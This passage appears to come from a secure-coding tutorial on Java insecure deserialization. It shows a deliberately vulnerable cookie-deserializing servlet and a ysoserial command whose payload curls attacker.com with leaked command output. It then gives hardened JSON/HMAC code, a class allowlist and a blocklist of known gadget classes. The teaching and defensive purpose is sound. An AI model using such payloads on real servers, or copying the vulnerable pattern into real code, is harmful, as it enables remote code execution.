                if ("userSession".equals(cookie.getName())) {
                    // VULNERABLE: Deserializing untrusted data from cookie
                    String sessionData = cookie.getValue();
                    byte[] data = Base64.getDecoder().decode(sessionData);

                    ByteArrayInputStream bis = new ByteArrayInputStream(data);
                    ObjectInputStream ois = new ObjectInputStream(bis);

                    try {
                        // This line can execute arbitrary code!
                        UserSession session = (UserSession) ois.readObject();
                        request.setAttribute("session", session);
                    } catch (ClassNotFoundException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }
}
```

**Attack Payload** (using ysoserial tool):
```bash
# Generate malicious serialized object using Commons Collections gadget chain
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64 -w0

# Resulting base64 payload is placed in cookie:
# Cookie: userSession=rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTa...
```

**Why This Is Dangerous**:
- ObjectInputStream executes code during deserialization via gadget chains
- Common libraries (Commons Collections, Spring, etc.) provide exploitable gadgets
- No validation occurs before code execution - the damage happens during readObject()
- Attacker gains Remote Code Execution (RCE) with server privileges
- Single malicious request can fully compromise the server

**SECURE VERSION**:

```java
import java.io.*;
import java.util.Base64;
import javax.servlet.http.*;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.logging.Logger;

public class SecureSessionHandler extends HttpServlet {

    private static final Logger logger = Logger.getLogger(SecureSessionHandler.class.getName());
    private static final String HMAC_SECRET = System.getenv("SESSION_HMAC_SECRET");
    private final ObjectMapper objectMapper;

    public SecureSessionHandler() {
        this.objectMapper = new ObjectMapper();
        // Disable dangerous features
        objectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
        objectMapper.deactivateDefaultTyping();
    }

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("userSession".equals(cookie.getName())) {
                    try {
                        // SECURE: Use JSON with HMAC signature verification
                        String signedData = cookie.getValue();
                        UserSession session = parseAndVerifySession(signedData);

                        if (session != null && session.isValid()) {
                            request.setAttribute("session", session);
                            logger.info("Session restored for user: " + session.getUserId());
                        }
                    } catch (SecurityException e) {
                        logger.warning("Tampered session detected from: " + request.getRemoteAddr());
                        // Fail securely - don't restore session
                    }
                }
            }
        }
    }

    private UserSession parseAndVerifySession(String signedData) throws SecurityException {
        String[] parts = signedData.split("\\.");
        if (parts.length != 2) {
            throw new SecurityException("Invalid session format");
        }

        String payload = parts[0];
        String signature = parts[1];

        // Verify HMAC signature before parsing
        if (!verifyHmac(payload, signature)) {
            throw new SecurityException("Invalid session signature");
        }

        try {
            byte[] jsonData = Base64.getUrlDecoder().decode(payload);
            return objectMapper.readValue(jsonData, UserSession.class);
        } catch (IOException e) {
            throw new SecurityException("Invalid session data", e);
        }
    }

    private boolean verifyHmac(String data, String expectedSignature) {
        try {
            Mac mac = Mac.getInstance("HmacSHA256");
            SecretKeySpec secretKey = new SecretKeySpec(
                HMAC_SECRET.getBytes(StandardCharsets.UTF_8), "HmacSHA256");
            mac.init(secretKey);
            byte[] hmacBytes = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
            String actualSignature = Base64.getUrlEncoder().withoutPadding().encodeToString(hmacBytes);
            return MessageDigest.isEqual(
                actualSignature.getBytes(StandardCharsets.UTF_8),
                expectedSignature.getBytes(StandardCharsets.UTF_8));
        } catch (NoSuchAlgorithmException | InvalidKeyException e) {
            return false;
        }
    }
}
```

**Key Security Controls**:
- **Never use ObjectInputStream with untrusted data**: Use JSON/Protobuf instead
- **Cryptographic signature verification**: HMAC ensures data integrity before parsing
- **Type-safe deserialization**: Jackson maps JSON directly to specific class, no gadget chains
- **Disabled polymorphic typing**: Prevents Jackson polymorphism attacks

Migration from Java serialization requires careful planning. You can use a serialization filter (Java 9+) as a transitional measure while migrating to safe formats. Here's a production-ready approach with defense in depth.

**PRODUCTION PATTERN**:

```java
import java.io.*;
import java.util.*;
import java.util.logging.Logger;
import java.util.concurrent.ConcurrentHashMap;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;
import io.micrometer.core.instrument.MeterRegistry;
import io.micrometer.core.instrument.Counter;

public class SecureSerializationService {

    private static final Logger logger = Logger.getLogger(SecureSerializationService.class.getName());
    private static final String SECURE_PREFIX = "JSON:";
    private static final String LEGACY_PREFIX = "JAVA:";

    private final ObjectMapper objectMapper;
    private final ObjectInputFilter allowlistFilter;
    private final Counter legacyDeserializationCounter;
    private final Counter jsonDeserializationCounter;
    private final Counter rejectedDeserializationCounter;

    // Strict allowlist of safe classes
    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.myapp.model.UserSession",
        "com.myapp.model.UserPreferences",
        "com.myapp.model.ShoppingCart",
        "java.lang.String",
        "java.lang.Integer",
        "java.lang.Long",
        "java.util.ArrayList",
        "java.util.HashMap",
        "java.util.Date"
    );

    // Known dangerous classes to always reject
    private static final Set<String> BLOCKED_CLASSES = Set.of(
        "org.apache.commons.collections.functors",
        "org.apache.commons.collections4.functors",
        "com.sun.org.apache.xalan",
        "javax.management",
        "java.lang.Runtime",
        "java.lang.ProcessBuilder",
        "sun.misc.Unsafe"
    );

    public SecureSerializationService(MeterRegistry meterRegistry) {
        this.objectMapper = createSecureObjectMapper();
        this.allowlistFilter = createSerializationFilter();

        // Metrics for monitoring
        this.legacyDeserializationCounter = meterRegistry.counter("deserialization.legacy");
        this.jsonDeserializationCounter = meterRegistry.counter("deserialization.json");
        this.rejectedDeserializationCounter = meterRegistry.counter("deserialization.rejected");
    }

    private ObjectMapper createSecureObjectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, true);
        mapper.configure(DeserializationFeature.FAIL_ON_NULL_FOR_PRIMITIVES, true);
        mapper.deactivateDefaultTyping(); // Critical: disable polymorphic typing
        return mapper;
    }

    private ObjectInputFilter createSerializationFilter() {
        return filterInfo -> {
            Class<?> clazz = filterInfo.serialClass();

            if (clazz == null) {
                // Allow primitives and arrays up to depth limit
                if (filterInfo.depth() > 10) {
                    logger.warning("Rejecting deep nesting: depth=" + filterInfo.depth());
                    return ObjectInputFilter.Status.REJECTED;
                }
                if (filterInfo.references() > 1000) {
                    logger.warning("Rejecting too many references: " + filterInfo.references());
                    return ObjectInputFilter.Status.REJECTED;
                }
                return ObjectInputFilter.Status.UNDECIDED;
            }

            String className = clazz.getName();

            // Check blocked list first
            for (String blocked : BLOCKED_CLASSES) {
                if (className.startsWith(blocked)) {
                    logger.severe("Blocked dangerous class: " + className);
                    rejectedDeserializationCounter.increment();
                    return ObjectInputFilter.Status.REJECTED;
                }
            }

            // Only allow explicitly allowlisted classes
            if (ALLOWED_CLASSES.contains(className)) {
                return ObjectInputFilter.Status.ALLOWED;
            }

            // Allow java.* primitives and standard collections
            if (className.startsWith("java.lang.") || 
                className.startsWith("java.util.") && !className.contains("concurrent")) {
                return ObjectInputFilter.Status.ALLOWED;
            }

            logger.warning("Rejecting unknown class: " + className);
            rejectedDeserializationCounter.increment();
            return ObjectInputFilter.Status.REJECTED;
        };
    }

    /**
     * Serialize object to secure JSON format (preferred)
     */
    public String serializeSecure(Object obj) throws IOException {
        byte[] jsonBytes = objectMapper.writeValueAsBytes(obj);
        return SECURE_PREFIX + Base64.getUrlEncoder().encodeToString(jsonBytes);
    }

    /**
     * Deserialize with automatic format detection and migration
     */
    public <T> T deserialize(String data, Class<T> targetClass) throws IOException {
        if (data == null || data.isEmpty()) {
            throw new IllegalArgumentException("Empty data");
        }

        // Prefer JSON format
        if (data.startsWith(SECURE_PREFIX)) {
            jsonDeserializationCounter.increment();
            return deserializeJson(data.substring(SECURE_PREFIX.length()), targetClass);
        }

        // Legacy Java serialization with strict filtering
        if (data.startsWith(LEGACY_PREFIX)) {
            legacyDeserializationCounter.increment();
            logger.info("Processing legacy serialized object - consider migration");
            return deserializeLegacyWithFilter(data.substring(LEGACY_PREFIX.length()), targetClass);
        }

        throw new IOException("Unknown serialization format");
    }

    private <T> T deserializeJson(String base64Data, Class<T> targetClass) throws IOException {
        byte[] jsonBytes = Base64.getUrlDecoder().decode(base64Data);
        return objectMapper.readValue(jsonBytes, targetClass);
    }

    private <T> T deserializeLegacyWithFilter(String base64Data, Class<T> targetClass) 
            throws IOException {
        byte[] bytes = Base64.getDecoder().decode(base64Data);

        try (ByteArrayInputStream bis = new ByteArrayInputStream(bytes);
             ObjectInputStream ois = new ObjectInputStream(bis)) {

            // CRITICAL: Apply filter BEFORE any deserialization
            ois.setObjectInputFilter(allowlistFilter);

            Object obj = ois.readObject();

            if (!targetClass.isInstance(obj)) {
                throw new IOException("Unexpected class: " + obj.getClass().getName());
            }

            return targetClass.cast(obj);
        } catch (ClassNotFoundException e) {
            throw new IOException("Class not found during deserialization", e);
        } catch (InvalidClassException e) {
            logger.severe("Serialization filter rejected class: " + e.getMessage());
            throw new IOException("Blocked dangerous deserialization attempt", e);
        }
    }

    /**
     * Migration helper: convert legacy serialized data to JSON
     */
    public <T> String migrateLegacyToJson(String legacyData, Class<T> targetClass) 
            throws IOException {
        T obj = deserialize(legacyData, targetClass);
        return serializeSecure(obj);
    }
}
```

**Defense in Depth Layers**:

1. **Serialization Format Migration** (Primary):
```java
// New data always uses JSON - no gadget chains possible
public String serializeSecure(Object obj) throws IOException {
    byte[] jsonBytes = objectMapper.writeValueAsBytes(obj);
    return SECURE_PREFIX + Base64.getUrlEncoder().encodeToString(jsonBytes);
}
```

2. **Strict Allowlist Filter** (For Legacy Compatibility):
```java
// Only explicitly approved classes can be deserialized
private static final Set<String> ALLOWED_CLASSES = Set.of(
    "com.myapp.model.UserSession",
    "com.myapp.model.UserPreferences"
);

// Known exploit gadgets are always blocked
private static final Set<String> BLOCKED_CLASSES = Set.of(
    "org.apache.commons.collections.functors",
    "com.sun.org.apache.xalan"
);
```

3. **Resource Limits**:
```java
// Prevent DoS via deeply nested or cyclic structures
if (filterInfo.depth() > 10) {
    return ObjectInputFilter.Status.REJECTED;
}
if (filterInfo.references() > 1000) {
    return ObjectInputFilter.Status.REJECTED;
}
```

**Additional Protections**:
- **Metrics and Alerting**: Track legacy deserialization usage to measure migration progress
- **Audit Logging**: Log all rejected deserialization attempts with class names for incident response
- **Gradual Migration**: Migration helper function converts legacy data to JSON on-read
- **JVM-Level Protection**: Set global filter via `jdk.serialFilter` system property as backup
- **Dependency Scanning**: Use tools like OWASP Dependency-Check to find vulnerable gadget libraries

**JVM Configuration for Production**:
```bash
# Set global serialization filter as defense in depth
java -Djdk.serialFilter="maxdepth=10;maxrefs=1000;maxbytes=500000;!org.apache.commons.collections.**;!com.sun.org.apache.xalan.**" -jar myapp.jar
```

**Migration Roadmap**:
1. Deploy with both formats supported and monitoring enabled
2. Monitor legacy deserialization counter - set alerts if it increases
3. Run migration job to convert stored legacy data to JSON
4. After 90 days with zero legacy usage, remove legacy support
5. Remove vulnerable gadget libraries (Commons Collections) from classpath

